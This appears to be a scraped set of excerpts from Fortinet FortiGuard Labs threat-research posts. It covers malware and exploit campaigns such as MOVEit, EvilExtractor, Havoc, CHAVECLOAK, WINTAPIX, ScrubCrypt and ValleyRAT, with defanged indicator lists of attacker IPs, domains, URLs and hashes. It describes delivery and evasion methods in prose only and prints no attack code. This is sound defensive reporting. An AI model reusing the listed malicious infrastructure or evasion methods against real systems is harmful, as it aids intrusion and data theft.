SHA-256:\n[SHIPPING_DOC.one]\n305D7962894C83EBFCC863FE129180F20E6144F1F59D70971249D14E6D178FA4\n[lo.bat]\nDE5331B71DC535F75DADE1FBD042120FE9732FA851700A54D5C423B45145C929\n[view.zip]\n66FBD626EAC4B285F093E5FBFF484DAA95D270E981EDA051836B5EE47EA7A01B\nLearn more about Fortinet'sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:All unpatched MOVEit Transfer versions running a SQL databaseImpacted Users:Any organization that uses a vulnerable version of MOVEit TransferImpact:Remote attackers can install a backdoor and exfiltrate dataSeverity Level:High\nFortiGuard Labs is aware of a critical zero-day SQL injection vulnerability in the MOVEit Secure Managed File Transfer software (CVE-2023-34362) allegedly exploited by the Cl0p ransomware threat actor. High-profile government, finance, media, aviation, and healthcare organizations have reportedly been affected, with data exfiltrated and stolen.\nDue to its severity, CISA released anadvisoryfor the vulnerability on June 1st, 2023. They also updated theKnown Exploited Vulnerabilitiescatalog on June 2ndwith CVE-2023-34362.\nThis blog contains information on what you need to know about CVE-2023-34362. For further details, please see the relatedFortiGuard Labs Outbreak Alert.", "source": "Fortinet"}, {"title": "Protect", "content": "FortiGuard Labs has the following AV signature available for the available web shell backdoor samples reportedly deployed after CVE-2023-34362 was exploited:\nJS/TiMove.A!tr.bdr\nFortiGuard Labs released the following IPS signature for CVE-2023-34362 in version 23.570:\nProgress.MOVEit.Transfer.Unrestricted.File.Upload\nWebfiltering blocks Network IOCs listed on the security advisory issued by Progress.\nFor a comprehensive list of protections from FortiGuard Labs, please visit theOutbreak Alert pagefor further details.", "source": "Fortinet"}, {"title": "Conclusion", "content": "CVE-2023-34362 has allegedly been leveraged by the Cl0p ransomware threat actor to compromise multiple organizations for data exfiltration and other malicious activities. Now that the vulnerability has gained public attention, we expect other threat actors to also leverage this vulnerability, and new attempts at exploitation will likely be accelerated. As such, FortiGuard Labs strongly urges MOVEit Transfer users to apply all patches and implement mitigations provided by the vendor as soon as possible.\nFortiGuard Labs will continue to actively monitor the situation for further insights and provide additional information about protections as they become available.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:WindowsImpacted parties:Any organizationImpact:Controls victim's device and collects sensitive informationSeverity level:Critical\nEvilExtractor (sometimes spelled Evil Extractor) is an attack tool designed to target Windows operating systems and extract data and files from endpoint devices. It includes several modules that all work via an FTP service. It was developed by a company named Kodex, which claims it is an educational tool. However, research conducted by FortiGuard Labs shows cybercriminals are actively using it as an info stealer.\nBased on our traffic source data to the host, evilextractor[.]com, malicious activity increased significantly in March 2023. FortiGuard Labs observed this malware in a phishing email campaign on 30 March, which we traced back to the samples included in this blog. It usually pretends to be a legitimate file, such as an Adobe PDF or Dropbox file, but once loaded, it begins to leverage PowerShell malicious activities. It also contains environment checking and Anti-VM functions. Its primary purpose seems to be to steal browser data and information from compromised endpoints and then upload it to the attacker's FTP server.\nWe recently reviewed a version of the malware that was injected into a victim's system and, as part of that analysis, identified that most of its victims are located in Europe and America. The developer released its project in October 2022 (Figure 1) and has kept updating it to increase its stability and strengthen its module.\nThis article will examine the initial attack method used to deliver EvilExtractor and its functions.", "source": "Fortinet"}, {"title": "Conclusion", "content": "EvilExtractor is being used as a comprehensive info stealer with multiple malicious features, including ransomware. Its PowerShell script can elude detection in a .NET loader or PyArmor. Within a very short time, its developer has updated several functions and increased its stability. This blog explains how threat actors launch an attack via phishing mail and what files are leveraged to extract the EvilExtracrtor PowerShell script. We also detailed what functions are included, what data can be collected by EvilExtractor, and how the Kodex Ransomware works. Users should be aware of this new info stealer and continue to be cautious about suspicious mail.", "source": "Fortinet"}, {"title": "ioc", "content": "IP Address:\n45[.]87[.]81[.]184193[.]42[.]33[.]232\nFiles:\n352efd1645982b8d23a841107007c8b4b024eb6bb5d6b312e5783ce4aa62b685023548a5ce0de9f8b748a2fd8c4d1ae6c924c40acbde32e9599c868115d11f4e75688c32a3c1f04df0fc02491180c8079d7fdc0babed981f5860f22f5e118a5e826c7c112dd1ae80469ef81f5066003d7691a349e6234c8f8ca9637b0984fc45b1ef1654839b73f03b73c4ef4e20ce4ecdef2236ec6e1ca36881438bc1758dcd17672795fb0c8df81ab33f5403e0e8ed15f4b2ac1e8ac9fef1fec4928387a36d", "source": "Fortinet"}, {"title": "Introduction", "content": "In the first half of 2022, FortiGuard Labs observed an overall increase in attack frequency paired with the explosive growth of new variants associated with familiar tactics. While attack volume isn't showing any signs of slowing, the back half of the year gave rise to some other distinct trends in activity. For starters, our team witnessed destructive wipermalware attacksimpacting more organizations across the globe, as well as enterprising cybercriminals reimagining existing botnets and reusing code to power new-and more sophisticated-attacks.\nIn our2H 2022 Threat Landscape Report, we examine the cyber-threat landscape over the year's second half to identify trends and offer insights on what security professionals should know to effectively protect their organizations in the new year and beyond. The report findings are based on the collective intelligence ofFortiGuard Labs, drawn from Fortinet's vast array of sensors collecting billions of threat events observed around the world during this same period. Below are key takeaways from the report.", "source": "Fortinet"}, {"title": "Summary", "content": "We're increasingly seeing cybercriminals take a \"work smarter, not harder\" approach to unveiling new tactics. From new advanced persistent cybercrime tactics to upgrading old-school botnets like Mirai, bad actors continually find more sophisticated ways to infiltrate networks, making every organization regardless of size or industry a target.", "source": "Fortinet"}, {"title": "Protect", "content": "As organizations' cyber defenses are improving, bad actors have their work cut out for them as they attempt to gain access to networks and evade detection. However, the growth of CaaS means that there will continue to be a high volume of increasingly sophisticated attacks-and more new variants-for security teams to contend with.\nTo protect against cybercriminals' growing list of tactics, organizations must focus on consolidating their security technology, reducing the number of vendors they work with to remove complexity from day-to-day operations. In the face of a growing threat landscape, security teams should also consider working with a trusted third party to conductincident response and readiness activities-like developing playbooks and conducting tabletop exercises-to ensure they're prepared to defend the organization when an incident occurs.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High\nIn January 2024, FortiGuard Labs collected a PDF file written in Portuguese that distributes a multi-functional malware known as Byakugan. While investigating this campaign,a reportabout it was published. Therefore, this report will only provide a brief analysis of the overlap between that attack and this and focus primarily on the details of the infostealer.", "source": "Fortinet"}, {"title": "Conclusion", "content": "There is a growing trend to use both clean and malicious components in malware, and Byakugan is no exception. This approach increases the amount of noise generated during analysis, making accurate detections more difficult. However, the downloaded files provided critical details about how Byakugan works, which helped us analyze the malicious modules. FortiGuard Labs will continue to monitor this malware and provide updates on this variant as they become available.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:Microsoft WindowsImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High\nHavoc is a powerful command-and-control (C2) framework. Like other well-known C2 frameworks, such asCobalt Strike,Silver, andWinos4.0, Havoc has been used inthreat campaignsto gain full control over the target. Additionally, It is open-source and available on GitHub, making it easier for threat actors to modify it to evade detection.\nFortiGuard Labs recently discovered a phishing campaign that combines ClickFix and multi-stage malware to deploy a modified Havoc Demon Agent. The threat actor hides each malware stage behind a SharePoint site and uses a modified version of Havoc Demon in conjunction with the Microsoft Graph API to obscure C2 communications within trusted, well-known services. Figure 1 shows the attack chain.", "source": "Fortinet"}, {"title": "Conclusion", "content": "In addition to staying alert for phishing emails, guided messages that encourage opening a terminal or PowerShell must be handled with extra caution to prevent inadvertently downloading and executing malicious commands.\nIn this article, we uncovered the execution flow and the altered open-source post-exploitation framework used in this attack. Public services once again play a crucial role in the attack campaign, now further integrated with modified Havoc Demon to hide malicious communication within the Microsoft Graph API, making identification and detection even more challenging.\nFortinet Protections\nThe malware described in this report are detected and blocked byFortiGuard Antivirusas:\nHTML/Agent.A5D4!trPowerShell/MalwThreat!ebc5FTPython/Agent.DF60!trW64/Havoc.L!tr\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\nTheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document.\nFortiGuard Labs provides theBackdoor.Havoc.AgentIPS signature to block Havoc C2 network communications.\nWe also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\nFortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "ioc", "content": "C2\nhao771[.]sharepoint.com\nFiles\n51796effe230d9eca8ec33eb17de9c27e9e96ab52e788e3a9965528be2902330989f58c86343704f143c0d9e16893fad98843b932740b113e8b2f8376859d2ddA5210aaa9eb51e866d9c2ef17f55c0526732eacb1a412b910394b6b51246b7dacc151456cf7df7ff43113e5f82c4ce89434ab40e68cd6fb362e4ae4f70ce65b3", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Controls victim's device and collects sensitive informationSeverity Level:High\nFortiGuard Labs recently uncovered a threat actor employing a malicious PDF file to propagate the banking Trojan CHAVECLOAK. This intricate attack involves the PDF downloading a ZIP file and subsequently utilizing DLL side-loading techniques to execute the final malware. Notably, CHAVECLOAK is specifically designed to target users in Brazil, aiming to steal sensitive information linked to financial activities.\nFigure 1 shows the detailed flow of this cyber threat.\nIn the South American cyberthreat landscape, banking trojans employ a range of tactics, such as phishing emails, malicious attachments, and browser manipulation. Notable examples include Casbaneiro (Metamorfo/Ponteiro), Guildma, Mekotio, and Grandoreiro. These trojans specialize in illicitly obtaining online banking credentials and personal data, posing a significant threat to users in countries like Brazil and Mexico. The CHAVECLOAK's Command and Control (C2) server telemetry is shown in Figure 2. In this blog, we will elaborate on the details of the malware.", "source": "Fortinet"}, {"title": "Conclusion", "content": "The emergence of the CHAVECLOAK banking Trojan underscores the evolving landscape of cyberthreats targeting the financial sector, specifically focusing on users in Brazil. Utilizing sophisticated techniques, including malicious PDFs, ZIP file downloads, DLL sideloading, and deceptive pop-ups, it joins a cohort of prominent banking trojans that primarily target South America. CHAVECLOAK employs Portuguese language settings, indicating a strategic approach to the region, and actively monitors victims' interactions with financial portals. CHAVECLOAK exemplifies the sophistication of contemporary banking trojans, necessitating continual vigilance and proactive cybersecurity measures to safeguard against evolving threats within the financial landscape of South America.\nFortinet Protections\nThe malware described in this report are detected and blocked byFortiGuard Antivirusas:\nPDF/Agent.72C4!trW32/Banker.CNX!tr\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\nThe URLs are rated as \"Malicious Websites\" by the FortiGuard Web Filtering service.\nTheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros in the document.\nWe also suggest that organizations go through Fortinet's freeFortinet Certified Fundamentals (FCF)in cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology.\nFortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "ioc", "content": "IP\n64[.]225[.]32[.]24\nURLs\nhxxps://webattach.mail.yandex.net/message_part_real/NotaFiscalEsdeletronicasufactrub66667kujhdfdjrWEWGFG09t5H6854JHGJUUR[.]ziphxxps://goo[.]su/FTD9owO\nHostnames\nmariashow[.]ddns[.]netcomunidadebet20102[.]hopto[.]org\nFiles:\n51512659f639e2b6e492bba8f956689ac08f792057753705bf4b9273472c72c448c9423591ec345fc70f31ba46755b5d225d78049cfb6433a3cb86b4ebb5a0284ab3024e7660892ce6e8ba2c6366193752f9c0b26beedca05c57dcb684703006131d2aa44782c8100c563cd5febf49fcb4d26952d7e6e2ef22f805664686ffff8b39baec4b955e8dfa585d54263fd84fea41a46554621ee46b769a706f6f965c634542fdd6581dd68b88b994bc2291bf41c60375b21620225a927de35b5620f92ca1b23be99b6d46ce1bbd7ed16ea62c900802d8efff1d206bac691342678e55", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:WindowsImpacted parties:Windows UsersImpact:Allows remote code execution and persistent access to the host (backdoor) and the rest of the network (proxy)Severity level:Medium\nAt Fortinet, we monitor suspicious executables that make use of open-source tools and frameworks. One of the things that we keep an eye out for is tools that use theDonutproject. Donut is a position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters. During our daily threat-hunting process in early February, we encountered a kernel driver that used the Donut tool and caught our attention for further analysis.\nThe sample that triggered our rule was a driver called WinTapix.sys (which is why we named it WINTAPIX). Since it uses Donut, we decided to analyze it further. It turned out to be a very interesting sample that we believe is being used in targeted attacks against countries in the Middle East.\nThis captured sample was compiled in May 2020 but was only uploaded to Virus Total in February of this year. Pivoting from this sample, we found another variant of this driver with the same name that was compiled around the same time, but it was uploaded to Virus Total in September 2022. Pivoting again from the used certificates, we found another variant of the WINTAPIX driver with the SRVNET2.SYS name. This sample was compiled in June 2021 and was first observed in the wild in December 2021.\nBased on the information we have collected so far, we now believe that this driver has been active in the wild since at least mid-2020 and, to the best of our knowledge, has not been reported before.\nObserved telemetry shows that 65% of the lookups for this driver were from Saudi Arabia, indicating it was a primary target. This same telemetry shows a considerable increase in the number of lookups for this driver in August and September 2022 and again in February and March 2023. This may indicate that the actor(s) behind this driver was operating major campaigns on these dates.\nHowever, we still do not have enough information about how this driver has been distributed and who was behind these operations. Based on the victimology, we suspect an Iranian threat actor developed this driver. Observed telemetry shows that while this driver has primarily targeted Saudi Arabia, it has also been detected in Jordan, Qatar, and the United Arab Emirates, which are the classic targets of Iranian threat actors.\nSince Iranian threat actors are known to exploit Exchange servers to deploy additional malware, it is also possible that this driver has been employed alongside Exchange attacks. To that point, the compilation time of the drivers is also aligned with times when Iranian threat actors were exploiting Exchange server vulnerabilities.\nThe attribution process of this driver is still ongoing, and we will provide additional info when we have a better idea about the identity of the threat actor or group.\nIn this blog post, we provide a comprehensive analysis of this driver.", "source": "Fortinet"}, {"title": "Summary", "content": "We analyzed the sample with the SHA-256 hash of 8578bff36e3b02cc71495b647db88c67c3c5ca710b5a2bd539148550595d0330, also known as Wintapix.sys. As the file extension suggests, this is a Windows Kernel Driver. Figure 1 shows some of its attributes.\nIts digital signature is invalid, meaning the threat actor might first need to load a vulnerable (but legitimate) driver and exploit that to load the Wintapix.sys. But once the driver is loaded, the following execution chain runs:\nWintapix.sys is loaded in the kernel. \nWintapix.sys injects an embedded shellcode into a suitable process local system privilege. \nThe injected shellcode loads and executes an encrypted .NET payload.\nWe will look at these artifacts in more detail in the rest of the analysis.", "source": "Fortinet"}, {"title": "Conclusion", "content": "This blog provided a detailed analysis of a driver named WinTapix, which we identified in early Feb of this year. The driver uses a Donut open-source payload to inject its shell code. It seems to be primarily targeting Saudi Arabia. The attribution process of this driver is still ongoing, but based on the victims, we assess with low confidence that this is a work of an Iranian threat actor.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High\nThe past few years have seen a significant increase in the number of Rust developers. Rust is a programming language focused on performance and reliability. However, for an attacker, its complicated assembly code is a significant merit.\nIn May 2024, FortiGuard Labs observed a Rust-based stealer. In addition to its intricate code, the stealer is distributed using a variety of strategies and has a flexible way of choosing its target. Because of this ambiguity, we decided to call it Fickle Stealer.\nThis article summarizes the details of this campaign, roughly dividing the attack chain into three stages: Delivery, Preparatory Work, and Packer and Stealer Payload.", "source": "Fortinet"}, {"title": "Conclusion", "content": "In addition to some popular applications, this stealer searches sensitive files in parent directories of common installation directories to ensure comprehensive data gathering. It also receives a target list from the server, which makes Fickle Stealer more flexible. Variants receiving an updated list are observed. The frequently updated attack chain also shows that it's still in development. FortiGuard will continue monitoring malware variants and provide appropriate protections as needed.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:Windows and macOSImpacted parties:Users of vulnerable versions of Adobe ColdFusionImpact:Remote attackers gain control of vulnerable systemsSeverity level:Critical\nThis past July, Adobe responded to reports of exploits targeting pre-authentication remote code execution (RCE) vulnerabilities in their ColdFusion solution by releasing a series of security updates:APSB23-40,APSB23-41, andAPSB23-47. An in-depthanalysisof those exploits has been documented by Project Discovery, including a significant vulnerability in the WDDX deserialization process within Adobe ColdFusion 2021.\nSince those updates, however, FortiGuard Labs IPS telemetry data has continued to detect numerous efforts to exploit the Adobe ColdFusion deserialization of untrusted data vulnerability, which poses a significant risk of arbitrary code execution (Figure 1). These attacks include probing, establishing reverse shells, and deploying malware for subsequent actions. This article provides a detailed analysis of how this threat group exploits the Adobe ColdFusion vulnerability.", "source": "Fortinet"}, {"title": "Conclusion", "content": "We have been tracking this vulnerability for weeks and have observed a significant volume of threat exploitation targeting Adobe ColdFusion. Although the patches for these vulnerabilities have already been released, public attacks are still occurring. We strongly urge users to upgrade affected systems immediately and apply FortiGuard protection to avoid threat probing.", "source": "Fortinet"}, {"title": "ioc", "content": "Attacker's IP Address:\n81[.]68[.]214[.]12281[.]68[.]197[.]382[.]156[.]147[.]183\nMalware Server's IP Address:\n103[.]255[.]177[.]55:6895\nFiles:\n7c6f0bae1e588821bd5d66cd98f52b7005e054279748c2c851647097fa2ae2df590d3088ed566cb3d85d48f4914cc657ee49b7d33e85c72167e7c72d81d4cb6c808f0f85aee6be3d3f3dd4bb827f556401c4d69a642ba4b1cb3645368954622e4f22fea4d0fadd2e01139021f98f04d3cae678e6526feb61fa8a6eceda13296a", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Compromised machines are under the control of the threat actorSeverity Level:High\nFortiGuard Labs has recently identified a sophisticated cyberattack involving an Excel file embedded with a VBA macro designed to deploy a DLL file. The attacker uses a multi-stage malware strategy to deliver the notorious \"Cobalt Strike\" payload and establish communication with a command and control (C2) server. This attack employs various evasion techniques to ensure successful payload delivery.Over the past few years, Ukraine has been a significant target due to its geopolitical situation. The history of these attacks reveals a pattern of increasing complexity and frequency, particularly during periods of geopolitical tension. For instance, in 2022,FortiGuard Labsreported a campaign using a malicious Excel document themed around the Ukrainian military to deliver a multi-stage Cobalt Strike loader. In 2023,Ukraine's Computer Emergency Response Team (CERT-UA)disclosed that UAC-0057 was involved in an attack using a malicious XLS file containing a macro and a lure image to deploy PicassoLoader and Cobalt Strike Beacon on compromised systems.\nIn this article, we will explore the technical details of this latest multi-stage attack.", "source": "Fortinet"}, {"title": "Conclusion", "content": "In this sophisticated attack, the assailant employs multi-stage malware tactics to thwart detection while ensuring operational stability. By implementing location-based checks during payload downloads, the attacker aims to mask suspicious activity, potentially eluding scrutiny by analysts. Leveraging encoded strings, the VBA conceals crucial import strings, facilitating the deployment of DLL files for persistence and decrypting subsequent payloads. Furthermore, the self-deletion feature aids evasion tactics, while the DLL injector employs delaying tactics and terminates parent processes to evade sandboxing and anti-debugging mechanisms, respectively.\nThese orchestrated maneuvers converge towards the deployment of Cobalt Strike onto targeted endpoints, particularly within the confines of Ukraine's geopolitical landscape. As Office documents provide troves of functionality, including numerous plugins and scripts, users must exercise utmost caution when handling files sourced from dubious origins. Vigilance is paramount, particularly regarding any suspicious file drops or unfamiliar startup programs within registry settings.", "source": "Fortinet"}, {"title": "ioc", "content": "Domains\ngoudieelectric[.]shop\nsimonandschuster[.]shop\nFiles\n88c97af92688d03601e4687b290d4d7f9f29492612e29f714f26a9278c6eda5b\n815c1571356cf328a18e0b1f3779d52e5ba11e5e4aac2d216b79bb387963c2be\n9649d58a220ed2b4474a37d6eac5f055e696769f87baf58b1d3d0b5da69cbce5\naf8104e567c6d614547acb36322ad2ed6469537cd1d78ae1be65fbde1d578abc\nde1bceb00c23e468f4f49a79ec69ec8ad3ed622a3ffc08f84c0481ad0f6f592b\n6f4642a203541426d504608eed7927718207f29be2922a4c9aa7e022f22e0deb\nd90f6e12a917ba42f7604362fafc4e74ed3ce3ffca41ed5d3456de28b2d144bf\nd9b16f077cd6e00137ba208031d22fd6423d0ef303883ad4b6f78638693f2044", "source": "Fortinet"}, {"title": "Introduction", "content": "On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants.\nThis latest edition of the Ransomware Roundup covers the Rancoz ransomware.\nAffected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High", "source": "Fortinet"}, {"title": "Victimology", "content": "At the time of our investigation, the Rancoz ransomware group had three victims in different industries listed on their date leak site. Two victims are in the U.S., and the other is in Canada. As seen in the below screenshot, the threat actor stole a significant amount of information and exposed that data to the public.\nNote that some ransomware groups remove company listings from data leak sites after the ransom is paid. Therefore, it is possible that there may be additional victims of the Rancoz ransomware.\nWhile submission locations are not a strong indicator of infection, the Rancoz ransomware samples have been submitted to a public file scanning service from the United States, India, France, and Lithuania. What's more interesting is that these submissions were made from early May to late June, which may indicate that the threat actor is still distributing the same Rancoz ransomware sample.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:GeoServer prior to versions 2.23.6, 2.24.4, and 2.25.2Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical\nGeoServer is anopen-source softwareserver written in Java that allows users to share and edit geospatial data. It is the reference implementation of the Open Geospatial Consortium (OGC) Web Feature Service (WFS) and Web Coverage Service (WCS) standards. On July 1, the project maintainers released anadvisoryfor the vulnerabilityCVE-2024-36401(CVSS score: 9.8). Multiple OGC request parameters allow remote code execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions. The shortcoming has beenaddressedin versions 2.23.6, 2.24.4, and 2.25.2.\nOn July 15, the U.S. Cybersecurity and Infrastructure Security Agency (CISA)addeda critical security flaw impacting OSGeo GeoServer GeoTools to its Known Exploited Vulnerabilities (KEV) catalog based on evidence of active exploitation. FortiGuard Labs added theIPS signaturethe next day and has observed multiple campaigns targeting this vulnerability to spread malware. The botnet family and miner groups strike the attack immediately. We also collect sidewalk backdoors, and GOREVERSE tries to exploit this vulnerability and set a connection with a command and control server (C2) to execute malicious actions.", "source": "Fortinet"}, {"title": "Conclusion", "content": "While GeoServer's open-source nature offers flexibility and customization, it also necessitates vigilant security practices to address its vulnerabilities. The developer patched the vulnerability with the function \"JXPathUtils.newSafeContext\" instead of the original vulnerable one to evaluate the XPath expression safety. However, implementing comprehensive cybersecurity measures-such as regularly updating software, employing threat detection tools, and enforcing strict access controls-can significantly mitigate these risks. By proactively addressing these threats, organizations can secure their environments and ensure the protection and reliability of these data infrastructures.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:WindowsImpacted parties:Any organizationImpact:Cryptojacks vulnerable systemsSeverity level:Critical\nBetween January and February 2023, FortiGuard Labs observed a payload targeting an exploitable Oracle Weblogic Server in a specific URI. This payload extracts ScrubCrypt, which obfuscates and encrypts applications and makes them able to dodge security programs. It already has an updated version, and the seller's webpage (Figure 1) guarantees that it can bypass Windows Defender and provide anti-debug and some bypass functions.\nWe analyzed the malware injected into a victim's system and, as part of our analysis, identified the threat actor as 8220 Gang using collected indicators. This mining group first appeared in 2017. The name \"8220\" comes from its original use of port 8220 for network communications.\nIn this article, we will elaborate on the details of ScrubCrypt and other malware delivered by this crypter in the past.", "source": "Fortinet"}, {"title": "Conclusion", "content": "8220 Gang is a well-known miner group that usually leverages public file-sharing websites and targets system vulnerabilities to infiltrate a victim's environment. Within a very short time, it has evolved to use a newer crypter variant, \"ScrubCrypt.\" Below is its complete attack chain. ScrubCrypt includes evasion and encryption functions, making it harder for anti-virus programs to detect 8220 Gang activity. Users should be aware of this updated crypter and keep their systems patched.", "source": "Fortinet"}, {"title": "ioc", "content": "URLs:\nsu-95[.]letmaker[.]top\nwork[.]letmaker[.]top\nIP Address:\n163[.]123[.]142[.]210\n185[.]17[.]0[.]19\n79[.]137[.]203[.]156\n209[.]141[.]38[.]219\n45[.]142[.]122[.]11\n179[.]43[.]155[.]202\nFiles:\nd9e7d3dbb299f76bb8a84e3b72cc8e78e86ea90e2dc777cdcfd51dbd10657f47\n179be54b3c2e29571fec9dcd16781eee3ce997c5352d9cce4834a10fc11d636b\n20a8278b25d5c27e861dc5188f9ffd40fc45db4131245ce1020c6fa9909841d1\n3422e84ca8e1ce5b106415d074667721772a7a8e9de3cd911665bad42145926c\na9d0af5af4cebbcce59ad5ef823a8d0ec71147799692c03be784f9e1670467ca\n84f8580343323b8534d2321c1b8789df544c4941e12d8dfa5a1fbcd201b97e72\n15cc89335d137fde5c61e540cd1c77718653ed7f359b206aeb85f25e5928096a\n57223450820cbe9cf5779083b7d85c440bb8b529505c55579bfcc5816bf5c80a\n9e2ddef83a3043de6a1f655a556fe3eca522656ad5e6056dd92ad13fa354b32f\n4d3be48fd3dde635cccd87a9925749c5a166e9b52026b5277883c7f3ab50c520\n55ba36d2ee2c5359dec3a425d27df9c3fb1ddede8cef74fd0bd69d38434609fd\n2ad4c954313fe912a64c4116bf7ec5cbd2e6e3a88979f7b7c2863ca21ffc9dd9\n0159c3b4fdff4ba89ff9e56bf2cdcdc8aaaa35d1fa4661288225e3701f8569b5\nb3ceead8490dd68c344d5b009a8bf17ed7d24499a9d66dc3493033b5696f6632\n13a11140bc0c62fbc8a364f71dfdf91a3ef321bb8c9c212b3af5eb576488a95e\n0767cfa1fb304ba5ef61d25ddc580cf82170b84e6a04c856e84c6ad3ad98dc92\n922c114c3a7f69b3210624f3e267cfc330969d17c5813cd328557b1476ef1858\n21326ecbb4cf7fef735e04f8e51efd7c861f883844e22050eab8615c7605b2f5\ne6834bbc9946e79f8888d30e52ae72552c37f160a8e6ce3f56ae5a88ed190e91\nd6150fd4d9616788fcb6f765ab5052669feaf90ac926ad42a59f3abf4871edb8\n4e46e6ca8c993761238af82e33a98aee97e80a3c8c80d418fb410e9556788d97\na12c34fef1d6475d99aa9af2e8bf1fd55bca83982a0ee2a9131ffd9fd15cb2a7\nb62ea075cfc99980488bc206cba24ffcd4faccd8b1a80aec27d9d444c430095d\n283db6a012cb9183f45674cb43303fa9b6c9a7ebab41c821dc0cc122ad3bb43\nLearn more about Fortinet'sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:WindowsImpacted Users:Windows usersImpact:The information collected can be used for future attacksSeverity Level:Medium\nIn 2023, the InfoStealer market is a reasonably crowded affair. The likes of RedLine, Raccoon, and Vidar own a significant market share, with new entrants such as SaphireStealer appearing frequently. The latest entry, ExelaStealer has now taken the field. Very little backstory is available on ExelaStealer, with the earliest public mentions FortiGuard Labs could locate occurring in August 2023.\nFortiGuard Labs research reveals that ExelaStealer is a largely open-source InfoStealer with paid customizations available from the threat actor. It is written in Python, although it pulls resources from other languages (e.g., JavaScript) where needed. It can steal sensitive information from a Windows-based host (e.g., passwords, credit cards, cookies and session data, and general keylogging).\nFortiGuard Labs was able to obtain a sample. This blog will analyze its inner workings.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Data has become a valuable currency, and because of this, attempts to gather it will likely never cease. InfoStealer malware exfiltrates data belonging to corporations and individuals that can be used for blackmail, espionage, or ransom. Despite the number of infostealers in the wild, ExelaStealer shows there is still room for new players to emerge and gain traction.", "source": "Fortinet"}, {"title": "Introduction", "content": "FortiGuard Labs has repeatedly warned organizations about ransomware developers' increased targeting of Linux systems. So it came as no surprise when it was reported that a new Royal Ransomware variant has started targeting Linux machines. In this blog post, you will learn about the technical details of this new Linux version.\nAffected Platforms: Linux, Unix, ESXiImpacted Users:Linux and Virtual Machine UsersImpact:Most files on the compromised machines are encrypted, including virtual machinesSeverity Level:Medium", "source": "Fortinet"}, {"title": "Conclusion", "content": "This report shows that threat actors are actively pivoting to attack Linux/Unix environments. Although the sophistication of this sample is not comparable to state-of-the-art Windows ransomware-it doesn't include defensive evasion, anti-analysis, etc.-it is still very effective. We expect further development from this actor and more ransomware operators turning towards targeting Linux systems.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:Microsoft WindowsImpacted parties:Targeted Windows usersImpact:Compromised machines are under the control of the threat actorSeverity level:Medium\nFortiGuard Labs recently encountered an ongoing ValleyRAT campaign specifically targeting Chinese speakers. This malware has historically targeted e-commerce, finance, sales, and management enterprises.\nValleyRAT is a multi-stage malware that utilizes diverse techniques to monitor and control its victims and deploy arbitrary plugins to cause further damage. Another noteworthy characteristic of this malware is its heavy usage of shellcode to execute its many components directly in memory, significantly reducing its file footprint in the victim's system.\nThis blog provides a technical analysis of this campaign.", "source": "Fortinet"}, {"title": "Conclusion", "content": "In this article, we have detailed an elaborate and ongoing ValleyRAT campaign specifically targeting Chinese systems. This malware involves several components loaded in different stages and mainly uses shellcode to execute them directly in memory, significantly reducing its file trace in the system. Once the malware gains a foothold in the system, it supports commands capable of monitoring the victim's activities and delivering arbitrary plugins to further the threat actors' intentions.\nFortiGuard Labs will continue to monitor this ongoing campaign.\nFortinet Protections\nFortiGuard AntiVirus detects the malicious files identified in this report as\nW64/Agent.CCF!tr \nW64/ValleyRat.A!tr.spy 